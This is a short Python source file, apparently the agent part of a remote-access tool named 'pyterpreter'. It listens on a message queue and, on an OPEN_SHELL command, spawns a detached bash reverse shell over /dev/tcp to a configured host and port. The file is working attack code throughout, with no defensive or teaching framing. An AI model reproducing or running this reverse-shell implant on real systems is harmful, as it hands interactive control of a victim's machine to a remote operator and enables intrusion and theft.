import subprocess
from queue import SimpleQueue


from core.message import Message, MESSAGE_PURPOSE

from pyterpreter import config


def process_messages_forever(messages_received_queue: 'SimpleQueue[Message]'):
    while True:
        message = messages_received_queue.get()
        print(f'Received message {message}')

        if message.purpose == MESSAGE_PURPOSE.OPEN_SHELL:
            _open_shell(int(message.args[0]))


def _open_shell(port: int):
    _run_command_detached(f'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1')


def _run_command_detached(command: str):
    proc = subprocess.Popen('/bin/bash', stdin=subprocess.PIPE)
    proc.stdin.write(f'{command} &\nexit\n'.encode())
    proc.communicate()
